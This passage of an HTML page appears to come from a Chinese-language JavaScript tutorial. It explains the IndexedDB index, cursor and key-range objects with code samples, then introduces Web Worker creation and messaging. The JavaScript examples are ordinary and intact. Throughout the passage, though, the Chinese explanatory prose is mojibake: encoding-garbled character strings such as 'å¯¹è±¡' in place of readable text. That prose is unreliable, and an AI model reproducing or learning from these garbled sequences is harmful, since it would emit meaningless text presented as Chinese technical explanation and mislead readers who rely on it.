&#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.lName + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.fName + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.jTitle + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.company + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.eMail + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.phone + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.age + &#39;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">    tableEntry.appendChild(tableRow);</span><br><span class="line"></span><br><span class="line">    cursor.continue();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&#39;Entries all displayed.&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>IDBIndex å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p>
<ul>
<li><code>IDBIndex.name</code>ï¼šå­—ç¬¦ä¸²ï¼Œç´¢å¼•çš„åç§°ã€‚</li>
<li><code>IDBIndex.objectStore</code>ï¼šç´¢å¼•æ‰€åœ¨çš„å¯¹è±¡ä»“åº“ã€‚</li>
<li><code>IDBIndex.keyPath</code>ï¼šç´¢å¼•çš„ä¸»é”®ã€‚</li>
<li><code>IDBIndex.multiEntry</code>ï¼šå¸ƒå°”å€¼ï¼Œé’ˆå¯¹<code>keyPath</code>ä¸ºæ•°ç»„çš„æƒ…å†µï¼Œå¦‚æœè®¾ä¸º<code>true</code>ï¼Œåˆ›å»ºæ•°ç»„æ—¶ï¼Œæ¯ä¸ªæ•°ç»„æˆå‘˜éƒ½ä¼šæœ‰ä¸€ä¸ªæ¡ç›®ï¼Œå¦åˆ™æ¯ä¸ªæ•°ç»„éƒ½åªæœ‰ä¸€ä¸ªæ¡ç›®ã€‚</li>
<li><code>IDBIndex.unique</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºåˆ›å»ºç´¢å¼•æ—¶æ˜¯å¦å…è®¸ç›¸åŒçš„ä¸»é”®ã€‚</li>
</ul>
<p>IDBIndex å¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ï¼Œå®ƒä»¬éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œç«‹å³è¿”å›çš„éƒ½æ˜¯ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<ul>
<li><code>IDBIndex.count()</code>ï¼šç”¨æ¥è·å–è®°å½•çš„æ•°é‡ã€‚å®ƒå¯ä»¥æ¥å—ä¸»é”®æˆ– IDBKeyRange å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¿™æ—¶åªè¿”å›ç¬¦åˆä¸»é”®çš„è®°å½•æ•°é‡ï¼Œå¦åˆ™è¿”å›æ‰€æœ‰è®°å½•çš„æ•°é‡ã€‚</li>
<li><code>IDBIndex.get(key)</code>ï¼šç”¨æ¥è·å–ç¬¦åˆæŒ‡å®šä¸»é”®çš„æ•°æ®è®°å½•ã€‚</li>
<li><code>IDBIndex.getKey(key)</code>ï¼šç”¨æ¥è·å–æŒ‡å®šçš„ä¸»é”®ã€‚</li>
<li><code>IDBIndex.getAll()</code>ï¼šç”¨æ¥è·å–æ‰€æœ‰çš„æ•°æ®è®°å½•ã€‚å®ƒå¯ä»¥æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œéƒ½æ˜¯å¯é€‰çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç”¨æ¥æŒ‡å®šä¸»é”®ï¼Œç¬¬äºŒä¸ªå‚æ•°ç”¨æ¥æŒ‡å®šè¿”å›è®°å½•çš„æ•°é‡ã€‚å¦‚æœçœç•¥è¿™ä¸¤ä¸ªå‚æ•°ï¼Œåˆ™è¿”å›æ‰€æœ‰è®°å½•ã€‚ç”±äºè·å–æˆåŠŸæ—¶ï¼Œæµè§ˆå™¨å¿…é¡»ç”Ÿæˆæ‰€æœ‰å¯¹è±¡ï¼Œæ‰€ä»¥å¯¹æ€§èƒ½æœ‰å½±å“ã€‚å¦‚æœæ•°æ®é›†æ¯”è¾ƒå¤§ï¼Œå»ºè®®ä½¿ç”¨ IDBCursor å¯¹è±¡ã€‚</li>
<li><code>IDBIndex.getAllKeys()</code>ï¼šè¯¥æ–¹æ³•ä¸<code>IDBIndex.getAll()</code>æ–¹æ³•ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯è·å–æ‰€æœ‰ä¸»é”®ã€‚</li>
<li><code>IDBIndex.openCursor()</code>ï¼šç”¨æ¥è·å–ä¸€ä¸ª IDBCursor å¯¹è±¡ï¼Œç”¨æ¥éå†ç´¢å¼•é‡Œé¢çš„æ‰€æœ‰æ¡ç›®ã€‚</li>
<li><code>IDBIndex.openKeyCursor()</code>ï¼šè¯¥æ–¹æ³•ä¸<code>IDBIndex.openCursor()</code>æ–¹æ³•ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯éå†æ‰€æœ‰æ¡ç›®çš„ä¸»é”®ã€‚</li>
</ul>
<h3 id="IDBCursor-å¯¹è±¡"><a href="#IDBCursor-å¯¹è±¡" class="headerlink" title="IDBCursor å¯¹è±¡"></a>IDBCursor å¯¹è±¡</h3><p>IDBCursor å¯¹è±¡ä»£è¡¨æŒ‡é’ˆå¯¹è±¡ï¼Œç”¨æ¥éå†æ•°æ®ä»“åº“ï¼ˆIDBObjectStoreï¼‰æˆ–ç´¢å¼•ï¼ˆIDBIndexï¼‰çš„è®°å½•ã€‚</p>
<p>IDBCursor å¯¹è±¡ä¸€èˆ¬é€šè¿‡<code>IDBObjectStore.openCursor()</code>æ–¹æ³•è·å¾—ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var transaction &#x3D; db.transaction([&#39;rushAlbumList&#39;], &#39;readonly&#39;);</span><br><span class="line">var objectStore &#x3D; transaction.objectStore(&#39;rushAlbumList&#39;);</span><br><span class="line"></span><br><span class="line">objectStore.openCursor(null, &#39;next&#39;).onsuccess &#x3D; function(event) &#123;</span><br><span class="line">  var cursor &#x3D; event.target.result;</span><br><span class="line">  if (cursor) &#123;</span><br><span class="line">    var listItem &#x3D; document.createElement(&#39;li&#39;);</span><br><span class="line">    listItem.innerHTML &#x3D; cursor.value.albumTitle + &#39;, &#39; + cursor.value.year;</span><br><span class="line">    list.appendChild(listItem);</span><br><span class="line"></span><br><span class="line">    console.log(cursor.source);</span><br><span class="line">    cursor.continue();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&#39;Entries all displayed.&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>IDBCursor å¯¹è±¡çš„å±æ€§ã€‚</p>
<ul>
<li><code>IDBCursor.source</code>ï¼šè¿”å›æ­£åœ¨éå†çš„å¯¹è±¡ä»“åº“æˆ–ç´¢å¼•ã€‚</li>
<li><code>IDBCursor.direction</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæŒ‡é’ˆéå†çš„æ–¹å‘ã€‚å…±æœ‰å››ä¸ªå¯èƒ½çš„å€¼ï¼šnextï¼ˆä»å¤´å¼€å§‹å‘åéå†ï¼‰ã€nextuniqueï¼ˆä»å¤´å¼€å§‹å‘åéå†ï¼Œé‡å¤çš„å€¼åªéå†ä¸€æ¬¡ï¼‰ã€prevï¼ˆä»å°¾éƒ¨å¼€å§‹å‘å‰éå†ï¼‰ã€prevuniqueï¼ˆä»å°¾éƒ¨å¼€å§‹å‘å‰éå†ï¼Œé‡å¤çš„å€¼åªéå†ä¸€æ¬¡ï¼‰ã€‚è¯¥å±æ€§é€šè¿‡<code>IDBObjectStore.openCursor()</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šï¼Œä¸€æ—¦æŒ‡å®šå°±ä¸èƒ½æ”¹å˜äº†ã€‚</li>
<li><code>IDBCursor.key</code>ï¼šè¿”å›å½“å‰è®°å½•çš„ä¸»é”®ã€‚</li>
<li><code>IDBCursor.value</code>ï¼šè¿”å›å½“å‰è®°å½•çš„æ•°æ®å€¼ã€‚</li>
<li><code>IDBCursor.primaryKey</code>ï¼šè¿”å›å½“å‰è®°å½•çš„ä¸»é”®ã€‚å¯¹äºæ•°æ®ä»“åº“ï¼ˆobjectStoreï¼‰æ¥è¯´ï¼Œè¿™ä¸ªå±æ€§ç­‰åŒäº IDBCursor.keyï¼›å¯¹äºç´¢å¼•ï¼ŒIDBCursor.key è¿”å›ç´¢å¼•çš„ä½ç½®å€¼ï¼Œè¯¥å±æ€§è¿”å›æ•°æ®è®°å½•çš„ä¸»é”®ã€‚</li>
</ul>
<p>IDBCursor å¯¹è±¡æœ‰å¦‚ä¸‹æ–¹æ³•ã€‚</p>
<ul>
<li><code>IDBCursor.advance(n)</code>ï¼šæŒ‡é’ˆå‘å‰ç§»åŠ¨ n ä¸ªä½ç½®ã€‚</li>
<li><code>IDBCursor.continue()</code>ï¼šæŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä¸ªä½ç½®ã€‚å®ƒå¯ä»¥æ¥å—ä¸€ä¸ªä¸»é”®ä½œä¸ºå‚æ•°ï¼Œè¿™æ—¶ä¼šè·³è½¬åˆ°è¿™ä¸ªä¸»é”®ã€‚</li>
<li><code>IDBCursor.continuePrimaryKey()</code>ï¼šè¯¥æ–¹æ³•éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>key</code>ï¼Œç¬¬äºŒä¸ªæ˜¯<code>primaryKey</code>ï¼Œå°†æŒ‡é’ˆç§»åˆ°ç¬¦åˆè¿™ä¸¤ä¸ªå‚æ•°çš„ä½ç½®ã€‚</li>
<li><code>IDBCursor.delete()</code>ï¼šç”¨æ¥åˆ é™¤å½“å‰ä½ç½®çš„è®°å½•ï¼Œè¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚è¯¥æ–¹æ³•ä¸ä¼šæ”¹å˜æŒ‡é’ˆçš„ä½ç½®ã€‚</li>
<li><code>IDBCursor.update()</code>ï¼šç”¨æ¥æ›´æ–°å½“å‰ä½ç½®çš„è®°å½•ï¼Œè¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚å®ƒçš„å‚æ•°æ˜¯è¦å†™å…¥æ•°æ®åº“çš„æ–°çš„å€¼ã€‚</li>
</ul>
<h3 id="IDBKeyRange-å¯¹è±¡"><a href="#IDBKeyRange-å¯¹è±¡" class="headerlink" title="IDBKeyRange å¯¹è±¡"></a>IDBKeyRange å¯¹è±¡</h3><p>IDBKeyRange å¯¹è±¡ä»£è¡¨æ•°æ®ä»“åº“ï¼ˆobject storeï¼‰é‡Œé¢çš„ä¸€ç»„ä¸»é”®ã€‚æ ¹æ®è¿™ç»„ä¸»é”®ï¼Œå¯ä»¥è·å–æ•°æ®ä»“åº“æˆ–ç´¢å¼•é‡Œé¢çš„ä¸€ç»„è®°å½•ã€‚</p>
<p>IDBKeyRange å¯ä»¥åªåŒ…å«ä¸€ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸Šé™å’Œä¸‹é™ã€‚å®ƒæœ‰å››ä¸ªé™æ€æ–¹æ³•ï¼Œç”¨æ¥æŒ‡å®šä¸»é”®çš„èŒƒå›´ã€‚</p>
<ul>
<li><code>IDBKeyRange.lowerBound()</code>ï¼šæŒ‡å®šä¸‹é™ã€‚</li>
<li><code>IDBKeyRange.upperBound()</code>ï¼šæŒ‡å®šä¸Šé™ã€‚</li>
<li><code>IDBKeyRange.bound()</code>ï¼šåŒæ—¶æŒ‡å®šä¸Šä¸‹é™ã€‚</li>
<li><code>IDBKeyRange.only()</code>ï¼šæŒ‡å®šåªåŒ…å«ä¸€ä¸ªå€¼ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€äº›ä»£ç å®ä¾‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; All keys â‰¤ x</span><br><span class="line">var r1 &#x3D; IDBKeyRange.upperBound(x);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys &lt; x</span><br><span class="line">var r2 &#x3D; IDBKeyRange.upperBound(x, true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys â‰¥ y</span><br><span class="line">var r3 &#x3D; IDBKeyRange.lowerBound(y);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys &gt; y</span><br><span class="line">var r4 &#x3D; IDBKeyRange.lowerBound(y, true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys â‰¥ x &amp;&amp; â‰¤ y</span><br><span class="line">var r5 &#x3D; IDBKeyRange.bound(x, y);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys &gt; x &amp;&amp;&lt; y</span><br><span class="line">var r6 &#x3D; IDBKeyRange.bound(x, y, true, true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys &gt; x &amp;&amp; â‰¤ y</span><br><span class="line">var r7 &#x3D; IDBKeyRange.bound(x, y, true, false);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys â‰¥ x &amp;&amp;&lt; y</span><br><span class="line">var r8 &#x3D; IDBKeyRange.bound(x, y, false, true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The key &#x3D; z</span><br><span class="line">var r9 &#x3D; IDBKeyRange.only(z);</span><br></pre></td></tr></table></figure>

<p><code>IDBKeyRange.lowerBound()</code>ã€<code>IDBKeyRange.upperBound()</code>ã€<code>IDBKeyRange.bound()</code>è¿™ä¸‰ä¸ªæ–¹æ³•é»˜è®¤åŒ…æ‹¬ç«¯ç‚¹å€¼ï¼Œå¯ä»¥ä¼ å…¥ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œä¿®æ”¹è¿™ä¸ªå±æ€§ã€‚</p>
<p>ä¸ä¹‹å¯¹åº”ï¼ŒIDBKeyRange å¯¹è±¡æœ‰å››ä¸ªåªè¯»å±æ€§ã€‚</p>
<ul>
<li><code>IDBKeyRange.lower</code>ï¼šè¿”å›ä¸‹é™</li>
<li><code>IDBKeyRange.lowerOpen</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºä¸‹é™æ˜¯å¦ä¸ºå¼€åŒºé—´ï¼ˆå³ä¸‹é™æ˜¯å¦æ’é™¤åœ¨èŒƒå›´ä¹‹å¤–ï¼‰</li>
<li><code>IDBKeyRange.upper</code>ï¼šè¿”å›ä¸Šé™</li>
<li><code>IDBKeyRange.upperOpen</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºä¸Šé™æ˜¯å¦ä¸ºå¼€åŒºé—´ï¼ˆå³ä¸Šé™æ˜¯å¦æ’é™¤åœ¨èŒƒå›´ä¹‹å¤–ï¼‰</li>
</ul>
<p>IDBKeyRange å®ä¾‹å¯¹è±¡ç”Ÿæˆä»¥åï¼Œå°†å®ƒä½œä¸ºå‚æ•°è¾“å…¥ IDBObjectStore æˆ– IDBIndex å¯¹è±¡çš„<code>openCursor()</code>æ–¹æ³•ï¼Œå°±å¯ä»¥åœ¨æ‰€è®¾å®šçš„èŒƒå›´å†…è¯»å–æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var t &#x3D; db.transaction([&#39;people&#39;], &#39;readonly&#39;);</span><br><span class="line">var store &#x3D; t.objectStore(&#39;people&#39;);</span><br><span class="line">var index &#x3D; store.index(&#39;name&#39;);</span><br><span class="line"></span><br><span class="line">var range &#x3D; IDBKeyRange.bound(&#39;B&#39;, &#39;D&#39;);</span><br><span class="line"></span><br><span class="line">index.openCursor(range).onsuccess &#x3D; function (e) &#123;</span><br><span class="line">  var cursor &#x3D; e.target.result;</span><br><span class="line">  if (cursor) &#123;</span><br><span class="line">    console.log(cursor.key + &#39;:&#39;);</span><br><span class="line"></span><br><span class="line">    for (var field in cursor.value) &#123;</span><br><span class="line">      console.log(cursor.value[field]);</span><br><span class="line">    &#125;</span><br><span class="line">    cursor.continue();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IDBKeyRange æœ‰ä¸€ä¸ªå®ä¾‹æ–¹æ³•<code>includes(key)</code>ï¼Œè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæŸä¸ªä¸»é”®æ˜¯å¦åŒ…å«åœ¨å½“å‰è¿™ä¸ªä¸»é”®ç»„ä¹‹å†…ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var keyRangeValue &#x3D; IDBKeyRange.bound(&#39;A&#39;, &#39;K&#39;, false, false);</span><br><span class="line"></span><br><span class="line">keyRangeValue.includes(&#39;F&#39;) &#x2F;&#x2F; true</span><br><span class="line">keyRangeValue.includes(&#39;W&#39;) &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><h3 id="æ¦‚è¿°-8"><a href="#æ¦‚è¿°-8" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>JavaScript è¯­è¨€é‡‡ç”¨çš„æ˜¯å•çº¿ç¨‹æ¨¡å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰ä»»åŠ¡åªèƒ½åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸Šå®Œæˆï¼Œä¸€æ¬¡åªèƒ½åšä¸€ä»¶äº‹ã€‚å‰é¢çš„ä»»åŠ¡æ²¡åšå®Œï¼Œåé¢çš„ä»»åŠ¡åªèƒ½ç­‰ç€ã€‚éšç€ç”µè„‘è®¡ç®—èƒ½åŠ›çš„å¢å¼ºï¼Œå°¤å…¶æ˜¯å¤šæ ¸ CPU çš„å‡ºç°ï¼Œå•çº¿ç¨‹å¸¦æ¥å¾ˆå¤§çš„ä¸ä¾¿ï¼Œæ— æ³•å……åˆ†å‘æŒ¥è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›ã€‚</p>
<p>Web Worker çš„ä½œç”¨ï¼Œå°±æ˜¯ä¸º JavaScript åˆ›é€ å¤šçº¿ç¨‹ç¯å¢ƒï¼Œå…è®¸ä¸»çº¿ç¨‹åˆ›å»º Worker çº¿ç¨‹ï¼Œå°†ä¸€äº›ä»»åŠ¡åˆ†é…ç»™åè€…è¿è¡Œã€‚åœ¨ä¸»çº¿ç¨‹è¿è¡Œçš„åŒæ—¶ï¼ŒWorker çº¿ç¨‹åœ¨åå°è¿è¡Œï¼Œä¸¤è€…äº’ä¸å¹²æ‰°ã€‚ç­‰åˆ° Worker çº¿ç¨‹å®Œæˆè®¡ç®—ä»»åŠ¡ï¼Œå†æŠŠç»“æœè¿”å›ç»™ä¸»çº¿ç¨‹ã€‚è¿™æ ·çš„å¥½å¤„æ˜¯ï¼Œä¸€äº›è®¡ç®—å¯†é›†å‹æˆ–é«˜å»¶è¿Ÿçš„ä»»åŠ¡å¯ä»¥äº¤ç”± Worker çº¿ç¨‹æ‰§è¡Œï¼Œä¸»çº¿ç¨‹ï¼ˆé€šå¸¸è´Ÿè´£ UI äº¤äº’ï¼‰èƒ½å¤Ÿä¿æŒæµç•…ï¼Œä¸ä¼šè¢«é˜»å¡æˆ–æ‹–æ…¢ã€‚</p>
<p>Worker çº¿ç¨‹ä¸€æ—¦æ–°å»ºæˆåŠŸï¼Œå°±ä¼šå§‹ç»ˆè¿è¡Œï¼Œä¸ä¼šè¢«ä¸»çº¿ç¨‹ä¸Šçš„æ´»åŠ¨ï¼ˆæ¯”å¦‚ç”¨æˆ·ç‚¹å‡»æŒ‰é’®ã€æäº¤è¡¨å•ï¼‰æ‰“æ–­ã€‚è¿™æ ·æœ‰åˆ©äºéšæ—¶å“åº”ä¸»çº¿ç¨‹çš„é€šä¿¡ã€‚ä½†æ˜¯ï¼Œè¿™ä¹Ÿé€ æˆäº† Worker æ¯”è¾ƒè€—è´¹èµ„æºï¼Œä¸åº”è¯¥è¿‡åº¦ä½¿ç”¨ï¼Œè€Œä¸”ä¸€æ—¦ä½¿ç”¨å®Œæ¯•ï¼Œå°±åº”è¯¥å…³é—­ã€‚</p>
<p>Web Worker æœ‰ä»¥ä¸‹å‡ ä¸ªä½¿ç”¨æ³¨æ„ç‚¹ã€‚</p>
<p>ï¼ˆ1ï¼‰<strong>åŒæºé™åˆ¶</strong></p>
<p>åˆ†é…ç»™ Worker çº¿ç¨‹è¿è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¿…é¡»ä¸ä¸»çº¿ç¨‹çš„è„šæœ¬æ–‡ä»¶åŒæºã€‚</p>
<p>ï¼ˆ2ï¼‰<strong>DOM é™åˆ¶</strong></p>
<p>Worker çº¿ç¨‹æ‰€åœ¨çš„å…¨å±€å¯¹è±¡ï¼Œä¸ä¸»çº¿ç¨‹ä¸ä¸€æ ·ï¼Œæ— æ³•è¯»å–ä¸»çº¿ç¨‹æ‰€åœ¨ç½‘é¡µçš„ DOM å¯¹è±¡ï¼Œä¹Ÿæ— æ³•ä½¿ç”¨<code>document</code>ã€<code>window</code>ã€<code>parent</code>è¿™äº›å¯¹è±¡ã€‚ä½†æ˜¯ï¼ŒWorker çº¿ç¨‹å¯ä»¥ä½¿ç”¨<code>navigator</code>å¯¹è±¡å’Œ<code>location</code>å¯¹è±¡ã€‚</p>
<p>ï¼ˆ3ï¼‰<strong>å…¨å±€å¯¹è±¡é™åˆ¶</strong></p>
<p>Worker çš„å…¨å±€å¯¹è±¡<code>WorkerGlobalScope</code>ï¼Œä¸åŒäºç½‘é¡µçš„å…¨å±€å¯¹è±¡<code>Window</code>ï¼Œå¾ˆå¤šæ¥å£æ‹¿ä¸åˆ°ã€‚æ¯”å¦‚ï¼Œç†è®ºä¸Š Worker çº¿ç¨‹ä¸èƒ½ä½¿ç”¨<code>console.log</code>ï¼Œå› ä¸ºæ ‡å‡†é‡Œé¢æ²¡æœ‰æåˆ° Worker çš„å…¨å±€å¯¹è±¡å­˜åœ¨<code>console</code>æ¥å£ï¼Œåªå®šä¹‰äº†<code>Navigator</code>æ¥å£å’Œ<code>Location</code>æ¥å£ã€‚ä¸è¿‡ï¼Œæµè§ˆå™¨å®é™…ä¸Šæ”¯æŒ Worker çº¿ç¨‹ä½¿ç”¨<code>console.log</code>ï¼Œä¿é™©çš„åšæ³•è¿˜æ˜¯ä¸ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p>
<p>ï¼ˆ4ï¼‰<strong>é€šä¿¡è”ç³»</strong></p>
<p>Worker çº¿ç¨‹å’Œä¸»çº¿ç¨‹ä¸åœ¨åŒä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œå®ƒä»¬ä¸èƒ½ç›´æ¥é€šä¿¡ï¼Œå¿…é¡»é€šè¿‡æ¶ˆæ¯å®Œæˆã€‚</p>
<p>ï¼ˆ5ï¼‰<strong>è„šæœ¬é™åˆ¶</strong></p>
<p>Worker çº¿ç¨‹ä¸èƒ½æ‰§è¡Œ<code>alert()</code>æ–¹æ³•å’Œ<code>confirm()</code>æ–¹æ³•ï¼Œä½†å¯ä»¥ä½¿ç”¨ XMLHttpRequest å¯¹è±¡å‘å‡º AJAX è¯·æ±‚ã€‚</p>
<p>ï¼ˆ6ï¼‰<strong>æ–‡ä»¶é™åˆ¶</strong></p>
<p>Worker çº¿ç¨‹æ— æ³•è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå³ä¸èƒ½æ‰“å¼€æœ¬æœºçš„æ–‡ä»¶ç³»ç»Ÿï¼ˆ<code>file://</code>ï¼‰ï¼Œå®ƒæ‰€åŠ è½½çš„è„šæœ¬ï¼Œå¿…é¡»æ¥è‡ªç½‘ç»œã€‚</p>
<h3 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><h4 id="ä¸»çº¿ç¨‹"><a href="#ä¸»çº¿ç¨‹" class="headerlink" title="ä¸»çº¿ç¨‹"></a>ä¸»çº¿ç¨‹</h4><p>ä¸»çº¿ç¨‹é‡‡ç”¨<code>new</code>å‘½ä»¤ï¼Œè°ƒç”¨<code>Worker()</code>æ„é€ å‡½æ•°ï¼Œæ–°å»ºä¸€ä¸ª Worker çº¿ç¨‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var worker &#x3D; new Worker(&#39;work.js&#39;);</span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>æ„é€ å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°±æ˜¯ Worker çº¿ç¨‹æ‰€è¦æ‰§è¡Œçš„ä»»åŠ¡ã€‚ç”±äº Worker ä¸èƒ½è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™ä¸ªè„šæœ¬å¿…é¡»æ¥è‡ªç½‘ç»œã€‚å¦‚æœä¸‹è½½æ²¡æœ‰æˆåŠŸï¼ˆæ¯”å¦‚404é”™è¯¯ï¼‰ï¼ŒWorker å°±ä¼šé»˜é»˜åœ°å¤±è´¥ã€‚</p>
<p>ç„¶åï¼Œä¸»çº¿ç¨‹è°ƒç”¨<code>worker.postMessage()</code>æ–¹æ³•ï¼Œå‘ Worker å‘æ¶ˆæ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(&#39;Hello World&#39;);</span><br><span class="line">worker.postMessage(&#123;method: &#39;echo&#39;, args: [&#39;Work&#39;]&#125;);</span><br></pre></td></tr></table></figure>

<p><code>worker.postMessage()</code>æ–¹æ³•çš„å‚æ•°ï¼Œå°±æ˜¯ä¸»çº¿ç¨‹ä¼ ç»™ Worker çš„æ•°æ®ã€‚å®ƒå¯ä»¥æ˜¯å„ç§æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬äºŒè¿›åˆ¶æ•°æ®ã€‚</p>
<p>æ¥ç€ï¼Œä¸»çº¿ç¨‹é€šè¿‡<code>worker.onmessage</code>æŒ‡å®šç›‘å¬å‡½æ•°ï¼Œæ¥æ”¶å­çº¿ç¨‹å‘å›æ¥çš„æ¶ˆæ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">worker.onmessage &#x3D; function (event) &#123;</span><br><span class="line">  doSomething(event.data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function doSomething() &#123;</span><br><span class="line">  &#x2F;&#x2F; æ‰§è¡Œä»»åŠ¡</span><br><span class="line">  worker.postMessage(&#39;Work done!&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œäº‹ä»¶å¯¹è±¡çš„<code>data</code>å±æ€§å¯ä»¥è·å– Worker å‘æ¥çš„æ•°æ®ã€‚</p>
<p>Worker å®Œæˆä»»åŠ¡ä»¥åï¼Œä¸»çº¿ç¨‹å°±å¯ä»¥æŠŠå®ƒå…³æ‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.terminate();</span><br></pre></td></tr></table></figure>

